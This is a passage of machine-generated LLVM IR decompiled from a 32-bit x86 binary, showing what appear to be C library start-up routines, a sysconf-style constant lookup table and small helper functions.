  %v5_804eaa8 = call i32 @function_804f2cc(%timespec* %v4_804eaa8, i32 %storemerge3.pre-phi, i32 %v2_804eaa8, i32 %v3_804eaa8)
  store i32 %v5_804eaa8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eaaf

dec_label_pc_804eaaf:                             ; preds = %dec_label_pc_804ea67, %dec_label_pc_804eaa8
  %v0_804eab2 = phi i32 [ %v0_804eab2.pre, %dec_label_pc_804ea67 ], [ %v5_804eaa8, %dec_label_pc_804eaa8 ]
  %v1_804eab2 = icmp eq i32 %v0_804eab2, 0
  br i1 %v1_804eab2, label %dec_label_pc_804eacf, label %dec_label_pc_804eab6

dec_label_pc_804eab6:                             ; preds = %dec_label_pc_804eaaf
  %v4_804eac6 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_804eac6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ead6

dec_label_pc_804eacf:                             ; preds = %dec_label_pc_804e958, %dec_label_pc_804eaaf
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ead6

dec_label_pc_804ead3:                             ; preds = %dec_label_pc_804e9f8, %dec_label_pc_804e9b3, %dec_label_pc_804e985
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ead6

dec_label_pc_804ead6:                             ; preds = %dec_label_pc_804eacf, %dec_label_pc_804eab6, %dec_label_pc_804ea2a, %dec_label_pc_804ead3
  %v0_804eae0 = phi i32 [ 0, %dec_label_pc_804eacf ], [ %v4_804eac6, %dec_label_pc_804eab6 ], [ %v0_804eae0.pre, %dec_label_pc_804ea2a ], [ -1, %dec_label_pc_804ead3 ]
  store i32 %v0_804e95b, i32* @ebx, align 4
  store i32 %v0_804e95a, i32* @esi, align 4
  store i32 %v0_804e959, i32* @edi, align 4
  store i32 %v0_804e958, i32* @ebp, align 4
  ret i32 %v0_804eae0

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804ea72, { 1, 0, 2 }
  uselistorder i32 %v2_804ea5e, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_804e9f5, { 2, 1, 0 }
  uselistorder i32 %v4_804e9d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e9b4, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_804e99b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_804e982, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8050c28, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ead6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804eacf, { 1, 0 }
  uselistorder label %dec_label_pc_804eaaf, { 1, 0 }
  uselistorder label %dec_label_pc_804eaa8, { 1, 0 }
}

define i32 @function_804eae4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804eae4:
  switch i32 %arg1, label %dec_label_pc_804eb03 [
    i32 0, label %dec_label_pc_804eb13
    i32 1, label %dec_label_pc_804ebf8
    i32 2, label %dec_label_pc_804eb1d
    i32 3, label %dec_label_pc_804eb27
    i32 4, label %dec_label_pc_804eb31
    i32 5, label %dec_label_pc_804ebc7
    i32 6, label %dec_label_pc_804eb39
    i32 7, label %dec_label_pc_804eaf9
    i32 8, label %dec_label_pc_804eaf9
    i32 9, label %dec_label_pc_804eaf9
    i32 10, label %dec_label_pc_804eaf9
    i32 11, label %dec_label_pc_804eaf9
    i32 12, label %dec_label_pc_804eaf9
    i32 13, label %dec_label_pc_804eaf9
    i32 14, label %dec_label_pc_804eaf9
    i32 15, label %dec_label_pc_804eaf9
    i32 16, label %dec_label_pc_804eaf9
    i32 17, label %dec_label_pc_804eaf9
    i32 18, label %dec_label_pc_804eaf9
    i32 19, label %dec_label_pc_804eaf9
    i32 20, label %dec_label_pc_804eaf9
    i32 21, label %dec_label_pc_804eaf9
    i32 22, label %dec_label_pc_804eaf9
    i32 23, label %dec_label_pc_804ebf8
    i32 24, label %dec_label_pc_804ebf8
    i32 25, label %dec_label_pc_804ec04
    i32 26, label %dec_label_pc_804ebd5
    i32 27, label %dec_label_pc_804ebf8
    i32 28, label %dec_label_pc_804eb4b
    i32 29, label %dec_label_pc_804ebce
    i32 30, label %dec_label_pc_804eb43
    i32 31, label %dec_label_pc_804ebe3
    i32 32, label %dec_label_pc_804ebf8
    i32 33, label %dec_label_pc_804ebf8
    i32 34, label %dec_label_pc_804ebf8
    i32 35, label %dec_label_pc_804ebdc
    i32 36, label %dec_label_pc_804ec0b
    i32 37, label %dec_label_pc_804ec12
    i32 38, label %dec_label_pc_804ec0b
    i32 39, label %dec_label_pc_804eb55
    i32 40, label %dec_label_pc_804ec19
    i32 41, label %dec_label_pc_804ebf8
    i32 42, label %dec_label_pc_804ebe3
    i32 43, label %dec_label_pc_804ec12
    i32 44, label %dec_label_pc_804ec20
    i32 45, label %dec_label_pc_804ec12
    i32 46, label %dec_label_pc_804ebce
    i32 47, label %dec_label_pc_804ebce
    i32 48, label %dec_label_pc_804ebce
    i32 49, label %dec_label_pc_804ebf8
    i32 50, label %dec_label_pc_804ebf8
    i32 51, label %dec_label_pc_804ebce
    i32 52, label %dec_label_pc_804ebce
    i32 53, label %dec_label_pc_804ebf8
    i32 54, label %dec_label_pc_804ebf8
    i32 55, label %dec_label_pc_804ebf8
    i32 56, label %dec_label_pc_804ebf8
    i32 57, label %dec_label_pc_804ebf8
    i32 58, label %dec_label_pc_804ebf8
    i32 59, label %dec_label_pc_804ebf8
    i32 60, label %dec_label_pc_804ebf8
    i32 61, label %dec_label_pc_804ebf8
    i32 62, label %dec_label_pc_804ebf8
    i32 63, label %dec_label_pc_804ebf8
    i32 64, label %dec_label_pc_804ebf8
    i32 65, label %dec_label_pc_804ebf8
    i32 66, label %dec_label_pc_804ebf8
    i32 67, label %dec_label_pc_804eaf9
    i32 68, label %dec_label_pc_804eaf9
    i32 69, label %dec_label_pc_804ebdc
    i32 70, label %dec_label_pc_804ebdc
    i32 71, label %dec_label_pc_804ebdc
    i32 72, label %dec_label_pc_804ebe3
    i32 73, label %dec_label_pc_804ebea
    i32 74, label %dec_label_pc_804ebf1
    i32 75, label %dec_label_pc_804eb5f
    i32 76, label %dec_label_pc_804ebf1
    i32 77, label %dec_label_pc_804eaf9
    i32 78, label %dec_label_pc_804eaf9
    i32 79, label %dec_label_pc_804eaf9
    i32 80, label %dec_label_pc_804eaf9
    i32 81, label %dec_label_pc_804eaf9
    i32 82, label %dec_label_pc_804eaf9
    i32 83, label %dec_label_pc_804eaf9
    i32 84, label %dec_label_pc_804eaf9
    i32 85, label %dec_label_pc_804ebf8
    i32 86, label %dec_label_pc_804ebf8
    i32 87, label %dec_label_pc_804ebd5
    i32 88, label %dec_label_pc_804eb69
    i32 89, label %dec_label_pc_804eb73
    i32 90, label %dec_label_pc_804ebea
    i32 91, label %dec_label_pc_804eaf9
    i32 92, label %dec_label_pc_804eaf9
    i32 93, label %dec_label_pc_804eaf9
    i32 94, label %dec_label_pc_804eaf9
    i32 95, label %dec_label_pc_804ebce
    i32 96, label %dec_label_pc_804ebf8
    i32 97, label %dec_label_pc_804ebf8
    i32 98, label %dec_label_pc_804eaf9
    i32 99, label %dec_label_pc_804eaf9
    i32 100, label %dec_label_pc_804eaf9
    i32 101, label %dec_label_pc_804eb7d
    i32 102, label %dec_label_pc_804ebc0
    i32 103, label %dec_label_pc_804ebfd
    i32 104, label %dec_label_pc_804ebd5
    i32 105, label %dec_label_pc_804eb87
    i32 106, label %dec_label_pc_804ebe3
    i32 107, label %dec_label_pc_804ebe3
    i32 108, label %dec_label_pc_804ebc7
    i32 109, label %dec_label_pc_804ec04
    i32 110, label %dec_label_pc_804ec20
    i32 111, label %dec_label_pc_804ebc0
    i32 112, label %dec_label_pc_804ebfd
    i32 113, label %dec_label_pc_804ec20
    i32 114, label %dec_label_pc_804eb91
    i32 115, label %dec_label_pc_804ec19
    i32 116, label %dec_label_pc_804ebf8
    i32 117, label %dec_label_pc_804ebf8
    i32 118, label %dec_label_pc_804eb9b
    i32 119, label %dec_label_pc_804eba5
    i32 120, label %dec_label_pc_804ec12
    i32 121, label %dec_label_pc_804ebd5
    i32 122, label %dec_label_pc_804ebd5
    i32 123, label %dec_label_pc_804ebd5
    i32 124, label %dec_label_pc_804ebd5
    i32 125, label %dec_label_pc_804eaf9
    i32 126, label %dec_label_pc_804eaf9
    i32 127, label %dec_label_pc_804ebf8
    i32 128, label %dec_label_pc_804ebf8
    i32 129, label %dec_label_pc_804eaf9
    i32 130, label %dec_label_pc_804eaf9
    i32 131, label %dec_label_pc_804ebf8
    i32 149, label %dec_label_pc_804ebac
  ]

dec_label_pc_804eaf9:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eb03:                             ; preds = %dec_label_pc_804eae4
  %v1_804eb03 = call i32 @function_804b4bc(i32 ptrtoint (i32* @0 to i32))
  %v1_804eb08 = inttoptr i32 %v1_804eb03 to i32*
  store i32 22, i32* %v1_804eb08, align 4
  br label %dec_label_pc_804ebf8

dec_label_pc_804eb13:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eb1d:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eb27:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eb31:                             ; preds = %dec_label_pc_804eae4
  %v0_804eb34 = call i32 @function_804f188()
  br label %dec_label_pc_804eb39

dec_label_pc_804eb39:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eb31
  br label %dec_label_pc_804ec25

dec_label_pc_804eb43:                             ; preds = %dec_label_pc_804eae4
  %v0_804eb46 = call i32 @function_804f228()
  br label %dec_label_pc_804eb4b

dec_label_pc_804eb4b:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eb43
  br label %dec_label_pc_804ec25

dec_label_pc_804eb55:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eb5f:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eb69:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eb73:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eb7d:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eb87:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eb91:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eb9b:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804eba5:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ebac:                             ; preds = %dec_label_pc_804eae4
  %v5_804ebb2 = call i32 @function_804f0e8(i32 1, %timespec* null, i32 149, i32 149)
  %v2_804ebba = icmp slt i32 %v5_804ebb2, 0
  %v1_804ebbc = icmp eq i1 %v2_804ebba, false
  br i1 %v1_804ebbc, label %dec_label_pc_804ebce, label %dec_label_pc_804ebf8

dec_label_pc_804ebc0:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ebc7:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ebce:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804ebac
  br label %dec_label_pc_804ec25

dec_label_pc_804ebd5:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ebdc:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ebe3:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ebea:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ebf1:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ebf8:                             ; preds = %dec_label_pc_804ebac, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eb03
  br label %dec_label_pc_804ec25

dec_label_pc_804ebfd:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ec04:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ec0b:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ec12:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ec19:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ec20:                             ; preds = %dec_label_pc_804eae4, %dec_label_pc_804eae4, %dec_label_pc_804eae4
  br label %dec_label_pc_804ec25

dec_label_pc_804ec25:                             ; preds = %dec_label_pc_804ec19, %dec_label_pc_804ec12, %dec_label_pc_804ec0b, %dec_label_pc_804ec04, %dec_label_pc_804ebfd, %dec_label_pc_804ebf1, %dec_label_pc_804ebea, %dec_label_pc_804ebe3, %dec_label_pc_804ebdc, %dec_label_pc_804ebd5, %dec_label_pc_804ebc7, %dec_label_pc_804ebc0, %dec_label_pc_804ebce, %dec_label_pc_804eba5, %dec_label_pc_804eb9b, %dec_label_pc_804eb91, %dec_label_pc_804eb87, %dec_label_pc_804eb7d, %dec_label_pc_804eb73, %dec_label_pc_804eb69, %dec_label_pc_804eb5f, %dec_label_pc_804eb55, %dec_label_pc_804eb4b, %dec_label_pc_804eb39, %dec_label_pc_804eb27, %dec_label_pc_804eb1d, %dec_label_pc_804eb13, %dec_label_pc_804eaf9, %dec_label_pc_804ebf8, %dec_label_pc_804ec20
  %v0_804ec28 = phi i32 [ 255, %dec_label_pc_804ec19 ], [ 2048, %dec_label_pc_804ec12 ], [ 99, %dec_label_pc_804ec0b ], [ 20, %dec_label_pc_804ec04 ], [ -128, %dec_label_pc_804ebfd ], [ 1024, %dec_label_pc_804ebf1 ], [ 4, %dec_label_pc_804ebea ], [ 32, %dec_label_pc_804ebe3 ], [ 256, %dec_label_pc_804ebdc ], [ 2147483647, %dec_label_pc_804ebd5 ], [ 16, %dec_label_pc_804ebc7 ], [ 127, %dec_label_pc_804ebc0 ], [ 200112, %dec_label_pc_804ebce ], [ 9, %dec_label_pc_804eba5 ], [ 65535, %dec_label_pc_804eb9b ], [ -32768, %dec_label_pc_804eb91 ], [ -2147483648, %dec_label_pc_804eb87 ], [ 8, %dec_label_pc_804eb7d ], [ 500, %dec_label_pc_804eb73 ], [ 4096, %dec_label_pc_804eb69 ], [ 16384, %dec_label_pc_804eb5f ], [ 1000, %dec_label_pc_804eb55 ], [ 32768, %dec_label_pc_804eb4b ], [ 6, %dec_label_pc_804eb39 ], [ 65536, %dec_label_pc_804eb27 ], [ 100, %dec_label_pc_804eb1d ], [ 131072, %dec_label_pc_804eb13 ], [ 1, %dec_label_pc_804eaf9 ], [ -1, %dec_label_pc_804ebf8 ], [ 32767, %dec_label_pc_804ec20 ]
  ret i32 %v0_804ec28

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 30, { 1, 0 }
  uselistorder i32 19, { 3, 1, 0, 2 }
  uselistorder i32 13, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ec25, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_804ebf8, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_804ebce, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804eb4b, { 1, 0 }
  uselistorder label %dec_label_pc_804eb39, { 1, 0 }
}

define i32 @function_804ec2c() local_unnamed_addr {
dec_label_pc_804ec2c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ec2c = load i32, i32* @ebx, align 4
  store i32 %v0_804ec2c, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055648.173 to i32), i32 -134567496), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055648.173 to i32), i32 -134567496), i32 2), i32 0), label %dec_label_pc_804ec40, label %dec_label_pc_804ec4d

dec_label_pc_804ec40:                             ; preds = %dec_label_pc_804ec2c, %dec_label_pc_804ec40
  %v1_804ec478 = phi i32 [ %v1_804ec47, %dec_label_pc_804ec40 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055648.173 to i32), i32 -134567496), i32 2), i32 -1), %dec_label_pc_804ec2c ]
  store i32 ptrtoint (i32* @global_var_804ec47.174 to i32), i32* %stack_var_-16, align 4
  %v5_804ec40 = mul i32 %v1_804ec478, 4
  %v6_804ec40 = add i32 %v5_804ec40, ptrtoint (i32* @global_var_8055648.173 to i32)
  %v7_804ec40 = inttoptr i32 %v6_804ec40 to i32*
  %v8_804ec40 = load i32, i32* %v7_804ec40, align 4
  call void @__pseudo_call(i32 %v8_804ec40)
  %v0_804ec47.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ec47 = add i32 %v0_804ec47.pre, -1
  store i32 %v1_804ec47, i32* %ebx.global-to-local, align 4
  %v10_804ec48 = icmp eq i32 %v0_804ec47.pre, 0
  %v1_804ec4b = icmp eq i1 %v10_804ec48, false
  br i1 %v1_804ec4b, label %dec_label_pc_804ec40, label %dec_label_pc_804ec4d

dec_label_pc_804ec4d:                             ; preds = %dec_label_pc_804ec40, %dec_label_pc_804ec2c
  %v0_804ec4d = load i32, i32* @global_var_80580b4.175, align 4
  %v1_804ec52 = icmp eq i32 %v0_804ec4d, 0
  br i1 %v1_804ec52, label %dec_label_pc_804ec58, label %dec_label_pc_804ec56

dec_label_pc_804ec56:                             ; preds = %dec_label_pc_804ec4d
  %v0_804ec56 = load i32, i32* %stack_var_-16, align 4
  %v1_804ec56 = call i32 @unknown_0(i32 %v0_804ec56)
  br label %dec_label_pc_804ec58

dec_label_pc_804ec58:                             ; preds = %dec_label_pc_804ec56, %dec_label_pc_804ec4d
  %v0_804ec58 = load i32, i32* @global_var_80580b8.176, align 8
  %v1_804ec5e = icmp eq i32 %v0_804ec58, 0
  br i1 %v1_804ec5e, label %dec_label_pc_804ec67, label %dec_label_pc_804ec62

dec_label_pc_804ec62:                             ; preds = %dec_label_pc_804ec58
  %v2_804ec62 = load i32, i32* %stack_var_-16, align 4
  %v1_804ec65 = call i32 @unknown_0(i32 %v2_804ec62)
  br label %dec_label_pc_804ec67

dec_label_pc_804ec67:                             ; preds = %dec_label_pc_804ec62, %dec_label_pc_804ec58
  %v2_804ec67 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_804ec67

; uselistorder directives
  uselistorder i32 %v1_804ec47, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec40, { 1, 0 }
}

define i32 @function_804ec6b(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ec6b:
  ret i32 0
}

define i32 @function_804ec6e(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ec6e:
  %v0_804ec6e = load i32, i32* @eax, align 4
  ret i32 %v0_804ec6e
}

define i32 @function_804ec6f() local_unnamed_addr {
dec_label_pc_804ec6f:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804ec6f = load i32, i32* @esi, align 4
  %v0_804ec70 = load i32, i32* @ebx, align 4
  store i32 %v0_804ec70, i32* %stack_var_-8, align 4
  %v0_804ec74 = load i32, i32* @eax, align 4
  store i32 %v0_804ec74, i32* @esi, align 4
  %v0_804ec76 = load i32, i32* @edx, align 4
  store i32 %v0_804ec76, i32* @ebx, align 4
  %v5_804ec7b = call i32 @function_804efec(i32 %v0_804ec74, i32 1, i32 %tmp6, i32 %tmp2)
  %v1_804ec83 = add i32 %v5_804ec7b, 1
  %v8_804ec83 = icmp eq i32 %v1_804ec83, 0
  %v1_804ec84 = icmp eq i1 %v8_804ec83, false
  br i1 %v1_804ec84, label %dec_label_pc_804ec9f, label %dec_label_pc_804ec86

dec_label_pc_804ec86:                             ; preds = %dec_label_pc_804ec6f
  %v0_804ec88 = load i32, i32* @ebx, align 4
  %v5_804ec8e = call i32 @function_804f300(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8053ec0.177, i32 0, i32 0), i32 %v0_804ec88, i32 %v1_804ec83)
  %v1_804ec96 = load i32, i32* @esi, align 4
  %v12_804ec96 = icmp eq i32 %v5_804ec8e, %v1_804ec96
  br i1 %v12_804ec96, label %dec_label_pc_804ec9f, label %dec_label_pc_804ec9a

dec_label_pc_804ec9a:                             ; preds = %dec_label_pc_804ec86
  %v0_804ec9a = call i32 @function_804e2a4()
  br label %dec_label_pc_804ec9f

dec_label_pc_804ec9f:                             ; preds = %dec_label_pc_804ec86, %dec_label_pc_804ec6f, %dec_label_pc_804ec9a
  %v2_804ec9f = load i32, i32* %stack_var_-12, align 4
  %v2_804eca0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804eca0, i32* @ebx, align 4
  store i32 %v0_804ec6f, i32* @esi, align 4
  ret i32 %v2_804ec9f

; uselistorder directives
  uselistorder i32 ()* @function_804e2a4, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804ec9f, { 2, 0, 1 }
}

define i32 @function_804eca3() local_unnamed_addr {
dec_label_pc_804eca3:
  %v0_804eca6 = load i8, i8* @global_var_80580bc.178, align 4
  %v1_804eca6 = icmp eq i8 %v0_804eca6, 0
  %v1_804ecad = icmp eq i1 %v1_804eca6, false
  br i1 %v1_804ecad, label %dec_label_pc_804eca3.dec_label_pc_804ecdf_crit_edge, label %dec_label_pc_804ecaf

dec_label_pc_804eca3.dec_label_pc_804ecdf_crit_edge: ; preds = %dec_label_pc_804eca3
  %v0_804ece2.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804ecdf

dec_label_pc_804ecaf:                             ; preds = %dec_label_pc_804eca3
  store i8 1, i8* @global_var_80580bc.178, align 4
  store i32 4096, i32* @global_var_80580b0.179, align 16
  %v0_804ecda = call i32 @function_804bbc0()
  br label %dec_label_pc_804ecdf

dec_label_pc_804ecdf:                             ; preds = %dec_label_pc_804eca3.dec_label_pc_804ecdf_crit_edge, %dec_label_pc_804ecaf
  %v0_804ece2 = phi i32 [ %v0_804ece2.pre, %dec_label_pc_804eca3.dec_label_pc_804ecdf_crit_edge ], [ %v0_804ecda, %dec_label_pc_804ecaf ]
  ret i32 %v0_804ece2

; uselistorder directives
  uselistorder i8* @global_var_80580bc.178, { 1, 0 }
  uselistorder label %dec_label_pc_804ecdf, { 1, 0 }
}

define i32 @function_804ece3(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804ece3:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80580a8.180, align 8
  store i32 %arg6, i32* @global_var_80580b8.176, align 8
  %v2_804ed1a = mul i32 %arg2, 4
  %v3_804ed1a = add i32 %tmp31, %v2_804ed1a
  %v1_804ed1d = add i32 %v3_804ed1a, 4
  store i32 %v1_804ed1d, i32* @global_var_80580ac.171, align 4
  %v3_804ed25 = load i32, i32* %arg3, align 4
  %v14_804ed25 = icmp eq i32 %v1_804ed1d, %v3_804ed25
  %v1_804ed27 = icmp eq i1 %v14_804ed25, false
  br i1 %v1_804ed27, label %dec_label_pc_804ed2f, label %dec_label_pc_804ed29

dec_label_pc_804ed29:                             ; preds = %dec_label_pc_804ece3
  store i32 %v3_804ed1a, i32* @global_var_80580ac.171, align 4
  br label %dec_label_pc_804ed2f

dec_label_pc_804ed2f:                             ; preds = %dec_label_pc_804ece3, %dec_label_pc_804ed29
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_804ed34 = ptrtoint i32* %stack_var_-136 to i32
  %v3_804ed39 = bitcast i32* %stack_var_-136 to i8*
  %v4_804ed39 = call i32 @function_804ce60(i8* %v3_804ed39, i32 0, i32 120)
  %v0_804ed3e = load i32, i32* @global_var_80580ac.171, align 4
  br label %dec_label_pc_804ed46

dec_label_pc_804ed46:                             ; preds = %dec_label_pc_804ed46, %dec_label_pc_804ed2f
  %v0_804ed46 = phi i32 [ %v1_804ed49, %dec_label_pc_804ed46 ], [ %v0_804ed3e, %dec_label_pc_804ed2f ]
  %v1_804ed46 = inttoptr i32 %v0_804ed46 to i32*
  %v2_804ed46 = load i32, i32* %v1_804ed46, align 4
  %v3_804ed46 = icmp eq i32 %v2_804ed46, 0
  %v1_804ed49 = add i32 %v0_804ed46, 4
  %v1_804ed4c = icmp eq i1 %v3_804ed46, false
